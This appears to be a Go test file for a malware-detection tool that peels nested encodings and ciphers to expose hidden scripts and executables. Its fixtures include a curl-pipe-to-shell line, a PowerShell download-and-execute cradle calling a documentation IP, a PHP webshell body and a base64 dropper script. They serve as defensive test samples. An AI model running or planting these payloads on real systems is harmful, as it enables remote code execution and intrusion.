package peeler

import (
	"bytes"
	"compress/flate"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/big"
	"strings"
	"testing"
	"time"
)

const (
	upperDigits = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	lowerDigits = "abcdefghijklmnopqrstuvwxyz"
	numDigits   = "0123456789"
)

// referenceMsg and the vectors below come from Python's base64 module, so these
// decoders are checked against an implementation that is not this one.
const referenceMsg = "#!/bin/sh\ncurl http://203.0.113.9/x | sh\n"

func layerNamed(t *testing.T, name string) Unwrapper {
	t.Helper()
	for _, u := range DefaultUnwrappers() {
		if u.Name() == name {
			return u
		}
	}
	t.Fatalf("no layer named %s", name)
	return nil
}

func TestDecodersAgainstReferenceVectors(t *testing.T) {
	for _, c := range []struct{ layer, in string }{
		{"base85", "BOxzhX>KobXbNL>a%>=IbaZe!FE27MGcGVLF)=ePIWKr1d?0gZ3I"},
		{"ascii85", `,9\^LBl5SFBF86lEblk3FEDI_0/#(71G1@60ekI:3A5V"Hm!KD$3`},
		{"ascii85", `<~,9\^LBl5SFBF86lEblk3FEDI_0/#(71G1@60ekI:3A5V"Hm!KD$3~>`},
		{"base32hex", "4CGIUOJ9DONN6Q0ACDQN4R10D1Q78S1Q5SNJ4C1J5OO2SC9H6CN3IBRO41U20SR818======"},
	} {
		got, err := layerNamed(t, c.layer).Unwrap([]byte(c.in), 1<<20)
		if err != nil {
			t.Errorf("%s: %v", c.layer, err)
			continue
		}
		if string(got) != referenceMsg {
			t.Errorf("%s = %q", c.layer, got)
		}
	}
	// z85 only encodes whole groups, so the reference is padded with NULs.
	got, ok := decode85([]byte("boXZHx(kOBxBnl(A+(>iBAzE.fe27mgCgvlf!>EpiwkR1D)0Gz3ig5a"),
		newAlphabet(numDigits+lowerDigits+upperDigits+".-:+=^!/*?&<>()[]{}@%$#", false))
	if !ok || string(got) != referenceMsg+"\x00\x00\x00" {
		t.Errorf("z85 = %q, %v", got, ok)
	}
}

func TestDecodersAgainstPublishedExamples(t *testing.T) {
	for in, want := range map[string]string{"BB8": "AB", "%69 VD92EX0": "Hello!!", "UJCLQE7W581": "base-45"} { // RFC 9285
		if got, ok := decodeBase45([]byte(in)); !ok || string(got) != want {
			t.Errorf("base45 %q = %q, %v", in, got, ok)
		}
	}
	if got, ok := decodeBase91([]byte("fPNKd")); !ok || string(got) != "test" {
		t.Errorf("base91 = %q, %v", got, ok)
	}
	base58 := radixLayer("base58", "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")
	if got, ok := base58.decode([]byte("2NEpo7TZRRrLZSi2U")); !ok || string(got) != "Hello World!" {
		t.Errorf("base58 = %q, %v", got, ok)
	}
	if got, ok := base58.decode([]byte("11" + "2NEpo7TZRRrLZSi2U")); !ok || !bytes.HasPrefix(got, []byte{0, 0, 'H'}) {
		t.Errorf("base58 leading zeros = %q, %v", got, ok)
	}
}

func radixEncode(digits string, in []byte) []byte {
	n := new(big.Int).SetBytes(in)
	base, mod := big.NewInt(int64(len(digits))), new(big.Int)
	var out []byte
	for n.Sign() > 0 {
		n.DivMod(n, base, mod)
		out = append([]byte{digits[mod.Int64()]}, out...)
	}
	for _, b := range in {
		if b != 0 {
			break
		}
		out = append([]byte{digits[0]}, out...)
	}
	return out
}

func bitEncode(digits string, bits uint, in []byte) []byte {
	var out []byte
	var acc, have uint
	for _, b := range in {
		acc, have = acc<<8|uint(b), have+8
		for have >= bits {
			have -= bits
			out = append(out, digits[acc>>have&(1<<bits-1)])
		}
	}
	if have > 0 {
		out = append(out, digits[acc<<(bits-have)&(1<<bits-1)])
	}
	return out
}

func encode85(digits string, in []byte) []byte {
	var out []byte
	for len(in) > 0 {
		k := min(len(in), 4)
		var g [4]byte
		copy(g[:], in[:k])
		v := uint64(binary.BigEndian.Uint32(g[:]))
		var d [5]byte
		for i := 4; i >= 0; i-- {
			d[i] = digits[v%85]
			v /= 85
		}
		out = append(out, d[:k+1]...)
		in = in[k:]
	}
	return out
}

func encodeBase45(in []byte) []byte {
	var out []byte
	for ; len(in) >= 2; in = in[2:] {
		n := int(in[0])<<8 | int(in[1])
		out = append(out, base45Digits[n%45], base45Digits[n/45%45], base45Digits[n/2025])
	}
	if len(in) == 1 {
		out = append(out, base45Digits[int(in[0])%45], base45Digits[int(in[0])/45])
	}
	return out
}

func encodeBase91(in []byte) []byte {
	var out []byte
	acc, n := 0, 0
	for _, c := range in {
		acc |= int(c) << n
		n += 8
		if n > 13 {
			v := acc & 8191
			if v > 88 {
				acc >>= 13
				n -= 13
			} else {
				v = acc & 16383
				acc >>= 14
				n -= 14
			}
			out = append(out, base91Digits[v%91], base91Digits[v/91])
		}
	}
	if n > 0 {
		out = append(out, base91Digits[acc%91])
		if n > 7 || acc > 90 {
			out = append(out, base91Digits[acc/91])
		}
	}
	return out
}

func base92Digit(v int) byte {
	switch {
	case v == 0:
		return '!'
	case v <= 61:
		return byte('#' + v - 1)
	}
	return byte('a' + v - 62)
}

func encodeBase92(in []byte) []byte {
	var bits strings.Builder
	for _, b := range in {
		fmt.Fprintf(&bits, "%08b", b)
	}
	s := bits.String()
	var out []byte
	for len(s) >= 13 {
		var v int
		fmt.Sscanf(s[:13], "%b", &v)
		out = append(out, base92Digit(v/91), base92Digit(v%91))
		s = s[13:]
	}
	if s != "" {
		pad := s + strings.Repeat("0", 6)
		if len(s) <= 6 {
			var v int
			fmt.Sscanf(pad[:6], "%b", &v)
			out = append(out, base92Digit(v))
		} else {
			var v int
			fmt.Sscanf(pad[:13], "%b", &v)
			out = append(out, base92Digit(v/91), base92Digit(v%91))
		}
	}
	return out
}

// encoders holds what the decoders undo, by chain name. A substitution's entry
// is the forward direction, so the test is not just the decode table twice.
var encoders = map[string]func([]byte) []byte{
	"base85": func(b []byte) []byte { return encode85(numDigits+upperDigits+lowerDigits+"!#$%&()*+-;<=>?@^_`{|}~", b) },
	"base58": func(b []byte) []byte {
		return radixEncode("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", b)
	},
	"base58-flickr": func(b []byte) []byte {
		return radixEncode("123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ", b)
	},
	"base58-ripple": func(b []byte) []byte {
		return radixEncode("rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz", b)
	},
	"base62":           func(b []byte) []byte { return radixEncode(numDigits+upperDigits+lowerDigits, b) },
	"base62-inverted":  func(b []byte) []byte { return radixEncode(numDigits+lowerDigits+upperDigits, b) },
	"base36":           func(b []byte) []byte { return radixEncode(numDigits+lowerDigits, b) },
	"base36-upper":     func(b []byte) []byte { return radixEncode(numDigits+upperDigits, b) },
	"base32-lower":     func(b []byte) []byte { return bitEncode(lowerDigits+"234567", 5, b) },
	"base32hex":        func(b []byte) []byte { return bitEncode(numDigits+"ABCDEFGHIJKLMNOPQRSTUV", 5, b) },
	"base32-crockford": func(b []byte) []byte { return bitEncode(numDigits+"ABCDEFGHJKMNPQRSTVWXYZ", 5, b) },
	"zbase32":          func(b []byte) []byte { return bitEncode("ybndrfg8ejkmcpqxot1uwisza345h769", 5, b) },
	"base45":           encodeBase45,
	"base91":           encodeBase91,
	"base92":           encodeBase92,
	"base2":            func(b []byte) []byte { return bitEncode("01", 1, b) },
	"rot13":            func(b []byte) []byte { return caesar(b, 13) },
	"rot5":             rot5,
	"rot18":            func(b []byte) []byte { return rot5(caesar(b, 13)) },
	"rot47":            rot47,
	"atbash":           atbash,
	"reverse":          reversed,
}

func caesar(in []byte, shift int) []byte {
	out := append([]byte(nil), in...)
	for i, c := range out {
		switch {
		case c >= 'A' && c <= 'Z':
			out[i] = 'A' + byte((int(c-'A')+shift)%26)
		case c >= 'a' && c <= 'z':
			out[i] = 'a' + byte((int(c-'a')+shift)%26)
		}
	}
	return out
}

func rot5(in []byte) []byte {
	out := append([]byte(nil), in...)
	for i, c := range out {
		if c >= '0' && c <= '9' {
			out[i] = '0' + (c-'0'+5)%10
		}
	}
	return out
}

func rot47(in []byte) []byte {
	out := append([]byte(nil), in...)
	for i, c := range out {
		if c >= '!' && c <= '~' {
			out[i] = '!' + (c-'!'+47)%94
		}
	}
	return out
}

func atbash(in []byte) []byte {
	out := append([]byte(nil), in...)
	for i, c := range out {
		switch {
		case c >= 'A' && c <= 'Z':
			out[i] = 'Z' - (c - 'A')
		case c >= 'a' && c <= 'z':
			out[i] = 'z' - (c - 'a')
		}
	}
	return out
}

func encodeAny(name string, in []byte) []byte {
	if f, ok := encoders[name]; ok {
		return f(in)
	}
	var shift int
	if n, _ := fmt.Sscanf(name, "caesar-%d", &shift); n == 1 {
		return caesar(in, shift)
	}
	return encodeLayer(name, in)
}

func composeAny(payload []byte, layers ...string) []byte {
	out := payload
	for i := len(layers) - 1; i >= 0; i-- {
		out = encodeAny(layers[i], out)
	}
	return out
}

func peelDefault(b []byte) Result { return New().Peel(context.Background(), b) }

// largeELF does not compress away, so the encodings over it stay long enough to
// wrap and to carve.
func largeELF() []byte {
	out := append([]byte(nil), fakeELF...)
	var x uint32 = 2654435761
	for i := 0; i < 512; i++ {
		x = x*1664525 + 1013904223
		out = append(out, byte(x>>24))
	}
	return out
}

func hasChain(r Result, sig string) bool {
	for _, c := range r.Chains {
		if c.Signature() == sig {
			return true
		}
	}
	return false
}

func TestEveryBaseCarriesAChain(t *testing.T) {
	bases := []string{"base2", "base32-crockford", "base32-lower", "base32hex", "zbase32", "base36",
		"base36-upper", "base45", "base58", "base58-flickr", "base58-ripple", "base62", "base62-inverted",
		"base85", "base91", "base92"}
	for _, name := range bases {
		t.Run(name, func(t *testing.T) {
			r := peelDefault(composeAny(fakeELF, name, "gzip"))
			if r.Outcome != OutcomeRevealedExecutable {
				t.Fatalf("outcome = %s, chains %v", r.Outcome, r.Chains)
			}
			if !hasChain(r, name+">gzip") {
				t.Fatalf("chain %s>gzip missing from %v", name, r.Chains)
			}
		})
	}
}

func TestEveryCipherCarriesAChain(t *testing.T) {
	names := []string{"rot13", "rot5", "rot18", "rot47", "atbash", "reverse"}
	for shift := 1; shift <= 25; shift++ {
		if shift != 13 {
			names = append(names, fmt.Sprintf("caesar-%d", shift))
		}
	}
	for _, name := range names {
		t.Run(name, func(t *testing.T) {
			r := peelDefault(composeAny(fakeELF, name, "base64", "gzip"))
			if r.Outcome != OutcomeRevealedExecutable {
				t.Fatalf("outcome = %s, chains %v", r.Outcome, r.Chains)
			}
			if !hasChain(r, name+">base64>gzip") {
				t.Fatalf("chain missing from %v", r.Chains)
			}
		})
	}
}

// One layer of base64 is packaging; one of rot13 is intent, and no build tool
// writes it. It flags on its own, unlike the depth-1 reveals it sits beside.
func TestASingleSubstitutionIsObfuscation(t *testing.T) {
	script := []byte("#!/bin/sh\ncurl http://203.0.113.9/x | sh\n")
	for _, name := range []string{"rot13", "caesar-7", "atbash", "reverse"} {
		r := peelDefault(encodeAny(name, script))
		if r.Outcome != OutcomeRevealedScript || !hasChain(r, name) {
			t.Fatalf("%s: outcome %s, chains %v", name, r.Outcome, r.Chains)
		}
		if r.Score < DefaultThreshold {
			t.Errorf("%s: score %d is under the threshold", name, r.Score)
		}
	}
	if r := peelDefault(encodeAny("base64", script)); r.Outcome != OutcomeClean {
		t.Errorf("a single base64 layer should stay packaging, got %s", r.Outcome)
	}
}

// The PHP webshell staple: rot13 applied to compressed bytes, not to text.
func TestRotOverBinary(t *testing.T) {
	body := []byte("<?php system($_GET['c']); eval(base64_decode($_POST['p'])); ?>\n" + strings.Repeat("// padding\n", 8))
	blob := base64.StdEncoding.EncodeToString(caesar(encodeLayer("flate", body), 13))
	r := peelDefault([]byte(blob))
	if r.Outcome != OutcomeRevealedScript {
		t.Fatalf("outcome = %s, chains %v", r.Outcome, r.Chains)
	}
	if !hasChain(r, "base64>rot13>flate") {
		t.Fatalf("chains = %v", r.Chains)
	}
}

func TestPowerShellEncodedCommand(t *testing.T) {
	var wide bytes.Buffer
	for _, c := range []byte("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')") {
		wide.Write([]byte{c, 0})
	}
	r := peelDefault([]byte(base64.StdEncoding.EncodeToString(wide.Bytes())))
	if !hasChain(r, "base64>utf16") || r.Outcome != OutcomeRevealedScript {
		t.Fatalf("outcome %s, chains %v", r.Outcome, r.Chains)
	}
}

func TestChainsPastTheOldDepthLimit(t *testing.T) {
	cycle := []string{"base64", "gzip", "base58", "zlib", "rot13", "hex", "base85", "base32"}
	var layers []string
	for len(layers) < 24 {
		layers = append(layers, cycle...)
	}
	layers = layers[:24]
	r := peelDefault(composeAny(fakeELF, layers...))
	if r.Outcome != OutcomeRevealedExecutable || r.MaxDepth < 24 {
		t.Fatalf("outcome %s, depth %d, exhausted %q", r.Outcome, r.MaxDepth, r.ExhaustReason)
	}
}

func TestEncodingsNestInAnyOrder(t *testing.T) {
	for _, chain := range [][]string{
		{"base85", "rot47", "base64", "gzip"},
		{"reverse", "base64", "caesar-3", "base64", "zlib"},
		{"base58", "base64", "base91", "gzip"},
		{"rot13", "base64", "base64", "base64", "gzip"},
		{"atbash", "hex", "gzip"},
	} {
		sig := strings.Join(chain, ">")
		t.Run(sig, func(t *testing.T) {
			r := peelDefault(composeAny(fakeELF, chain...))
			if !hasChain(r, sig) {
				t.Fatalf("outcome %s, chains %v", r.Outcome, r.Chains)
			}
		})
	}
}

// `base64` wraps at 76 columns by default, and a blob that was not one unbroken
// run used to be no layer at all.
func TestWrappedBase64(t *testing.T) {
	enc := encodeLayer("base64", encodeLayer("gzip", largeELF()))
	var wrapped bytes.Buffer
	for len(enc) > 0 {
		k := min(len(enc), 76)
		wrapped.Write(enc[:k])
		wrapped.WriteByte('\n')
		enc = enc[k:]
	}
	if bytes.Count(wrapped.Bytes(), []byte("\n")) < 2 {
		t.Fatal("fixture is not wrapped")
	}
	if r := peelDefault(wrapped.Bytes()); r.Outcome != OutcomeRevealedExecutable {
		t.Fatalf("outcome = %s", r.Outcome)
	}
}

func TestByteLists(t *testing.T) {
	gz := encodeLayer("gzip", fakeELF)
	render := func(format, sep string) []byte {
		parts := make([]string, len(gz))
		for i, b := range gz {
			parts[i] = fmt.Sprintf(format, b)
		}
		return []byte(strings.Join(parts, sep))
	}
	for name, c := range map[string]struct {
		blob []byte
		sig  string
	}{
		"decimal":   {render("%d", " "), "base10>gzip"},
		"commas":    {render("%d", ","), "base10>gzip"},
		"0x":        {render("0x%02x", ", "), "base16>gzip"},
		"backslash": {render(`\x%02x`, ""), "base16>gzip"},
		"percent":   {render("%%%02x", ""), "base16>gzip"},
		"octal":     {render(`\%03o`, ""), "base8>gzip"},
		"binary":    {render("%08b", " "), "base2>gzip"},
	} {
		t.Run(name, func(t *testing.T) {
			if r := peelDefault(c.blob); !hasChain(r, c.sig) {
				t.Fatalf("outcome %s, chains %v", r.Outcome, r.Chains)
			}
		})
	}
}

func TestCarvesABlobOutOfAScript(t *testing.T) {
	blob := encodeLayer("base64", encodeLayer("gzip", largeELF()))
	script := "#!/bin/sh\n# updater\nD=\"" + string(blob) + "\"\necho \"$D\" | base64 -d | gunzip > /tmp/x\n"
	r := peelDefault([]byte(script))
	if r.Outcome != OutcomeRevealedExecutable || !hasChain(r, "carve>base64>gzip") {
		t.Fatalf("outcome %s, chains %v", r.Outcome, r.Chains)
	}
}

// bestShifts can rank the text as it stands second, and shift 0 has no cipher.
// Ordinary Makefiles and m4 did this; a panic in the trial cost them the layer and
// marked the peel exhausted.
func TestCandidatesAreAllRealCiphers(t *testing.T) {
	samples := []string{
		strings.Repeat("CC=gcc\nCFLAGS=-O2 -g\nall: main.o\n\t$(CC) $(CFLAGS) -o app main.o\n", 8),
		strings.Repeat("define(`forloop', `pushdef(`$1', `$2')_forloop($@)popdef(`$1')')\n", 8),
		strings.Repeat("%%\n[a-zA-Z]+ { words++; }\n\\n { lines++; }\n%%\n", 8),
		strings.Repeat("xyz qqq zzz jjj kkk vvv www xxx\n", 8),
	}
	for _, s := range samples {
		for shift := 0; shift < 26; shift++ {
			w := caesar([]byte(s), shift)
			for _, c := range candidates(w, false) {
				if c == nil {
					t.Fatalf("nil candidate at shift %d of %q", shift, s[:24])
				}
			}
			if r := peelDefault(w); r.Exhausted {
				t.Fatalf("shift %d of %q: %s", shift, s[:24], r.ExhaustReason)
			}
		}
	}
}

// One base64 blob in a script is one layer, as it is in a file of its own. The
// carve found it; it does not add to what the blob was hidden behind.
func TestACarveIsNotALayer(t *testing.T) {
	body := []byte(strings.Repeat("#!/bin/sh\necho one encoded script\n", 20))
	script := "#!/bin/sh\nD=\"" + string(encodeLayer("base64", body)) + "\"\necho \"$D\" | base64 -d | sh\n"
	r := peelDefault([]byte(script))
	if !hasChain(r, "carve>base64") {
		t.Fatalf("the blob was not peeled: %v", r.Chains)
	}
	if r.Outcome != OutcomeClean || r.Score != 0 || r.MaxDepth != 1 {
		t.Fatalf("outcome %s, score %d, depth %d", r.Outcome, r.Score, r.MaxDepth)
	}
}

func TestACarveStillCountsTowardsTheBudget(t *testing.T) {
	blob := encodeLayer("base64", encodeLayer("gzip", largeELF()))
	script := "#!/bin/sh\nD=\"" + string(blob) + "\"\n"
	r := New(WithLimits(BudgetLimits{MaxDepth: 2})).Peel(context.Background(), []byte(script))
	if !r.Exhausted {
		t.Fatalf("carve>base64>gzip fit a depth budget of 2: %+v", r)
	}
}

// Test vectors and key material decode to text on every line. That carries a chain
// through a middle layer, but it is no reason to lift a blob out of a file.
func TestRunsOfEncodedTextAreLeftInPlace(t *testing.T) {
	var src strings.Builder
	src.WriteString("vectors = [\n")
	for i := 0; i < 20; i++ {
		line := fmt.Sprintf("this is test vector number %d, padded out with ordinary words", i)
		fmt.Fprintf(&src, "  %q,\n  %q,\n", encodeLayer("base64", []byte(line)), encodeLayer("hex", []byte(line)))
	}
	src.WriteString("]\n")
	r := peelDefault([]byte(src.String()))
	if r.Outcome != OutcomeClean || r.Exhausted || r.MaxDepth != 0 {
		t.Fatalf("outcome %s, depth %d, reason %q", r.Outcome, r.MaxDepth, r.ExhaustReason)
	}
}

// Every trap the gates exist for. Each of these is ordinary content that a
// decoder could "succeed" on, and depth alone would flag it.
func TestBenignTwinsStayClean(t *testing.T) {
	prose := strings.Repeat("The quick brown fox jumps over the lazy dog, and then it naps in the sun.\n", 40)
	code := strings.Repeat("func add(a, b int) int {\n\treturn exec(a) + eval(b) // arithmetic only\n}\n", 30)
	minified := strings.Repeat("function(a,b){return rkny(a)+hkoh(b)};var c=[1,2,3];", 60)
	for name, blob := range map[string]string{
		"prose":          prose,
		"source code":    code,
		"minified js":    minified,
		"json":           strings.Repeat(`{"name":"alice","age":34,"roles":["admin","dev"]}`+"\n", 40),
		"csv":            strings.Repeat("2026-11-06,12.5,73,88,91\n", 40),
		"number list":    strings.Repeat("10 20 30 40 50 60 70 80 90 100 200 250 ", 20),
		"sha256 list":    strings.Repeat("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  file\n", 20),
		"api token":      "tok_16C7e42F292c6912E7710c838347Ae178B4aABCD1234567890abcdefGHIJKLMNOP",
		"wrapped prose":  strings.Repeat("This line of prose is exactly as wide as the others here\n", 12),
		"long word":      strings.Repeat("abcdefghijklmnop", 200),
		"data uri":       `<img src="data:image/png;base64,` + strings.Repeat("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ", 8) + `">`,
		"base64 of text": string(encodeLayer("base64", []byte(prose))),
	} {
		t.Run(name, func(t *testing.T) {
			r := peelDefault([]byte(blob))
			if r.Outcome != OutcomeClean || r.Score != 0 || len(r.Findings) != 0 {
				t.Fatalf("outcome %s, score %d, depth %d, chains %v", r.Outcome, r.Score, r.MaxDepth, r.Chains)
			}
			for _, c := range r.Chains {
				if c.hasCipher() {
					t.Fatalf("a substitution fired on ordinary content: %v", c)
				}
			}
		})
	}
}

// Rotating plain text gives more plain text, forever. Without the reveal gate
// this is what would have turned depth into a false positive.
func TestTextDoesNotGrowDepth(t *testing.T) {
	text := strings.Repeat("Ordinary documentation with nothing hidden in it at all.\n", 50)
	if r := peelDefault([]byte(text)); r.MaxDepth != 0 || r.NodesVisited != 1 {
		t.Fatalf("depth %d after %d nodes", r.MaxDepth, r.NodesVisited)
	}
}

func TestHostileBlobsStayBounded(t *testing.T) {
	for name, blob := range map[string][]byte{
		"base58 alphabet, 1 MiB": bytes.Repeat([]byte("zzzzzzzzzzzzzzz"), 70000),
		"radix limit exactly":    bytes.Repeat([]byte("z"), maxRadixInput),
		"binary text, 1 MiB":     bytes.Repeat([]byte("01000001"), 131072),
		"number list, 1 MiB":     bytes.Repeat([]byte("255 "), 262144),
	} {
		t.Run(name, func(t *testing.T) {
			start := time.Now()
			r := peelDefault(blob)
			if d := time.Since(start); d > 10*time.Second {
				t.Fatalf("took %s", d)
			}
			if r.NodesVisited > DefaultLimits().MaxNodes {
				t.Fatalf("visited %d nodes", r.NodesVisited)
			}
		})
	}
}

func TestDeflateTrialReusesNothingUnsafe(t *testing.T) {
	var buf bytes.Buffer
	w, _ := flate.NewWriter(&buf, flate.DefaultCompression)
	w.Write([]byte(strings.Repeat("plain text that compresses well ", 10)))
	w.Close()
	if !inflatesToText(buf.Bytes()) {
		t.Fatal("real deflate not recognised")
	}
	if inflatesToText(bytes.Repeat([]byte{0xff, 0x13, 0x7a}, 40)) {
		t.Fatal("noise recognised as deflate")
	}
}
